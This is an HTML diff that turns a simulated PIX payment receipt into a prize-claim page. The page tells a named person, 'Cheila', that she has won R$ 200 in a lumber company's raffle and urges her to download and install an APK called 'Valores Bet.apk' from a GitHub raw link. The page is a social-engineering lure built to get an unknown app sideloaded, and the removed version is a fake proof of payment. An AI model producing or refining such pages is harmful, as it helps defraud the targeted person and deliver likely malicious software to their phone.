@@ -3,145 +3,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Comprovante PIX</title>
+    <title>Madeireira Premium | App Oficial</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f3f4f6;
+            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
+            min-height: 100vh;
+        }
+        
+        .wood-texture {
+            background-color: #3d2b1f;
+            background-image: url("https://www.transparenttextures.com/patterns/wood-pattern.png");
         }
 
-        .success-bg {
-            background-color: #00b894;
+        .glass-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.07);
         }
 
-        /* Animação do Check */
-        .checkmark-circle {
-            width: 80px;
-            height: 80px;
+        .btn-glow {
             position: relative;
-            display: inline-block;
-            vertical-align: top;
-            border-radius: 50%;
-            background: #ffffff;
-            margin-bottom: 20px;
+            overflow: hidden;
+            transition: all 0.4s ease;
         }
 
-        .checkmark-kick {
-            position: absolute;
-            width: 15px;
-            height: 35px;
-            background-color: #00b894;
-            left: 24px;
-            top: 36px;
-            transform: rotate(-45deg);
-            border-radius: 2px;
-            animation: kick 0.3s ease-out forwards;
+        .btn-glow:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(22, 163, 74, 0.3);
         }
 
-        .checkmark-stem {
+        .btn-glow::after {
+            content: "";
             position: absolute;
-            width: 15px;
-            height: 55px;
-            background-color: #00b894;
-            left: 45px;
-            top: 14px;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255,255,255,0.2);
             transform: rotate(45deg);
-            border-radius: 2px;
-            animation: stem 0.3s ease-out forwards;
+            transition: 0.5s;
+            left: -100%;
         }
 
-        @keyframes kick {
-            0% { height: 0; opacity: 0; }
-            100% { height: 35px; opacity: 1; }
+        .btn-glow:hover::after {
+            left: 100%;
         }
 
-        @keyframes stem {
-            0% { height: 0; opacity: 0; }
-            100% { height: 55px; opacity: 1; }
+        @keyframes pulse-gold {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
+            70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
         }
 
-        .fade-in {
-            animation: fadeIn 0.6s ease-in-out forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .prize-badge {
+            animation: pulse-gold 2s infinite;
         }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body class="text-gray-900 antialiased">
 
-    <!-- Container do Smartphone Simulado -->
-    <div class="w-full max-w-md bg-white min-h-screen sm:min-h-0 sm:h-[700px] sm:rounded-3xl shadow-2xl overflow-hidden flex flex-col relative">
+    <!-- Header Elegante -->
+    <header class="wood-texture text-white py-8 shadow-2xl relative overflow-hidden">
+        <div class="absolute inset-0 bg-black opacity-20"></div>
+        <div class="container mx-auto px-4 text-center relative z-10">
+            <div class="flex flex-col items-center justify-center gap-2">
+                <div class="bg-yellow-500 p-3 rounded-xl mb-2 shadow-lg">
+                    <i class="fas fa-tree text-3xl text-white"></i>
+                </div>
+                <h1 class="text-2xl font-black tracking-[0.2em] text-white">MADEIREIRA <span class="text-yellow-500">PREMIUM</span></h1>
+                <div class="h-1 w-12 bg-yellow-500 rounded-full"></div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-6 py-12 flex flex-col items-center max-w-lg">
         
-        <!-- Barra de Status (Fictícia) -->
-        <div class="px-6 py-3 flex justify-between items-center bg-white text-gray-800 text-xs font-semibold">
-            <span>09:41</span>
-            <div class="flex gap-1.5 items-center">
-                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 21l-12-18h24z"/></svg>
-                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71z"/></svg>
-                <div class="w-5 h-2.5 border border-gray-400 rounded-sm relative">
-                    <div class="absolute inset-y-0.5 left-0.5 right-1 bg-gray-600"></div>
-                </div>
+        <!-- Banner de Vencedor Estilizado -->
+        <div class="w-full glass-card rounded-[2.5rem] p-8 mb-10 text-center relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10">
+                <i class="fas fa-crown text-6xl rotate-12"></i>
             </div>
-        </div>
-
-        <!-- Conteúdo Principal -->
-        <div class="flex-1 flex flex-col items-center justify-center px-8 text-center bg-white">
             
-            <!-- Ícone de Sucesso -->
-            <div class="checkmark-circle shadow-lg">
-                <div class="checkmark-kick"></div>
-                <div class="checkmark-stem"></div>
+            <div class="prize-badge inline-flex bg-yellow-500 text-white w-16 h-16 items-center justify-center rounded-full mb-6 shadow-xl">
+                <i class="fas fa-trophy text-2xl"></i>
             </div>
 
-            <h1 class="text-2xl font-bold text-gray-800 mb-2 fade-in" style="animation-delay: 0.4s;">
-                Pix enviado!
-            </h1>
-            <p class="text-gray-500 text-sm mb-8 fade-in" style="animation-delay: 0.5s;">
-                A transferência foi concluída com sucesso e o valor já está disponível na conta do favorecido.
+            <h2 class="text-3xl font-black text-gray-900 mb-3 tracking-tight">CHEILA, PARABÉNS!</h2>
+            <p class="text-gray-500 font-medium leading-relaxed">
+                O seu prêmio de <span class="text-green-600 font-extrabold text-2xl block my-2">R$ 200,00</span> está pronto para ser levantado.
             </p>
+            
+            <div class="mt-6 py-2 px-4 bg-yellow-50 inline-block rounded-full border border-yellow-100">
+                <p class="text-[10px] font-bold text-yellow-700 uppercase tracking-widest">Sorteio Trimestral Exclusivo</p>
+            </div>
+        </div>
 
-            <!-- Cards de Detalhes -->
-            <div class="w-full space-y-3 fade-in" style="animation-delay: 0.6s;">
-                <div class="bg-gray-50 rounded-xl p-4 flex items-center justify-between">
-                    <span class="text-gray-400 text-xs uppercase tracking-wider font-semibold">Data e Hora</span>
-                    <span id="current-time" class="text-gray-700 text-sm font-medium">--/--/---- às --:--</span>
-                </div>
-                <div class="bg-gray-50 rounded-xl p-4 flex items-center justify-between">
-                    <span class="text-gray-400 text-xs uppercase tracking-wider font-semibold">ID da Transação</span>
-                    <span class="text-gray-700 text-sm font-mono">E123456...890</span>
-                </div>
+        <!-- Secção de Download -->
+        <div class="w-full space-y-8">
+            <div class="text-center">
+                <h3 class="text-lg font-bold text-gray-700">Acesse ao seu Bônus</h3>
+                <p class="text-gray-400 text-sm mt-1">Siga o passo abaixo para instalar</p>
             </div>
 
+            <!-- Botão de Download Direto com a URL fornecida -->
+            <a href="http://github.com/Abravaaaa/AAAA/raw/main/Valores%20Bet.apk" class="btn-glow flex items-center justify-between w-full bg-stone-900 hover:bg-stone-800 text-white p-2 rounded-3xl shadow-2xl transition-all">
+                <span class="bg-green-600 w-14 h-14 rounded-2xl flex items-center justify-center text-2xl shadow-inner">
+                    <i class="fas fa-download"></i>
+                </span>
+                <span class="text-lg font-bold tracking-tight pr-8">BAIXAR APP (APK)</span>
+                <span></span> <!-- Spacer -->
+            </a>
+
+            <!-- Card Informativo Glassmorphism -->
+            <div class="glass-card p-6 rounded-3xl border-l-4 border-blue-500">
+                <div class="flex gap-4">
+                    <div class="text-blue-500 text-xl"><i class="fas fa-info-circle"></i></div>
+                    <div class="space-y-3">
+                        <p class="text-xs text-gray-600 leading-relaxed font-medium">
+                            Dentro da nossa aplicação terá acesso imediato a:
+                        </p>
+                        <ul class="text-[11px] text-gray-500 space-y-2">
+                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Levantamento de valores via PIX</li>
+                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Avaliação premiada</li>
+                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Novos sorteios a cada 90 dias</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <!-- Ações Inferiores -->
-        <div class="p-6 space-y-3 bg-white fade-in" style="animation-delay: 0.7s;">
-            <button class="w-full py-4 bg-gray-900 text-white rounded-2xl font-bold text-sm active:scale-95 transition-transform">
-                Ver comprovante completo
-            </button>
-            <button onclick="location.reload()" class="w-full py-4 bg-transparent text-gray-500 border border-gray-200 rounded-2xl font-bold text-sm active:scale-95 transition-transform">
-                Nova transferência
-            </button>
+        <!-- Timeline de Instalação -->
+        <div class="mt-16 w-full px-4">
+            <div class="relative flex justify-between items-center">
+                <div class="absolute h-0.5 bg-gray-200 w-full top-1/2 -z-10"></div>
+                
+                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
+                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">01</div>
+                </div>
+                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
+                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">02</div>
+                </div>
+                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
+                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">03</div>
+                </div>
+            </div>
+            <div class="flex justify-between mt-3 px-2">
+                <span class="text-[9px] font-black text-gray-400 uppercase">Download</span>
+                <span class="text-[9px] font-black text-gray-400 uppercase">Instalar</span>
+                <span class="text-[9px] font-black text-gray-400 uppercase">Resgatar</span>
+            </div>
         </div>
 
-        <!-- Barra Inferior -->
-        <div class="h-1.5 w-32 bg-gray-200 rounded-full mx-auto mb-2"></div>
-    </div>
+    </main>
 
-    <script>
-        // Atualiza a data e hora para o momento atual do envio
-        window.onload = function() {
-            const now = new Date();
-            const dateStr = now.toLocaleDateString('pt-BR');
-            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-            document.getElementById('current-time').innerText = `${dateStr} às ${timeStr}`;
-        };
-    </script>
+    <!-- Footer Premium -->
+    <footer class="mt-auto py-10 bg-white border-t border-gray-100">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-stone-400 text-[10px] font-bold tracking-[0.3em] uppercase mb-2">Madeireira Premium S.A.</p>
+            <div class="flex justify-center gap-4 text-gray-300 text-sm">
+                <i class="fab fa-instagram"></i>
+                <i class="fab fa-facebook"></i>
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <p class="text-gray-400 text-[9px] mt-4 italic">Sorteios auditados e processados via App Oficial.</p>
+        </div>
+    </footer>
+
 </body>
 </html>
